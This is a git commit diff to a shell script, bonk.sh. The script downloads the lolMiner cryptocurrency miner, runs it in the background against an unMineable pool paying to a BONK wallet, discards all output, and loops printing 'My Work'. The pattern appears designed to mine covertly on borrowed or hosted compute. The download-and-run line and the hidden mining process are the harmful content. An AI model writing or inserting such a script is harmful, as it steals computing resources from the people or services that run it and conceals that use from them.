fe609afbf2b603ba24a85d41b1e750ed7353e129
preak07 <160253225+preak07@users.noreply.github.com>
2024-02-21 00:52:39 +0700

    Update bonk.sh

--- bonk.sh
+++ bonk.sh
@@ -3,7 +3,7 @@ set -x
 apt-get update
 apt-get install -y curl wget
 mkdir .lolMiner && cd .lolMiner
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.84/lolMiner_v1.84_Lin64.tar.gz && tar -xf lolMiner_v1.84_Lin64.tar.gz && cd 1.84 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN.vivo --ethstratum ETHPROXY >/dev/null 2>&1 &
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.84/lolMiner_v1.84_Lin64.tar.gz && tar -xvf lolMiner_v1.84_Lin64.tar.gz && cd 1.84 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN.vivo >/dev/null 2>&1 &
 while true
 do
         echo "My Work"
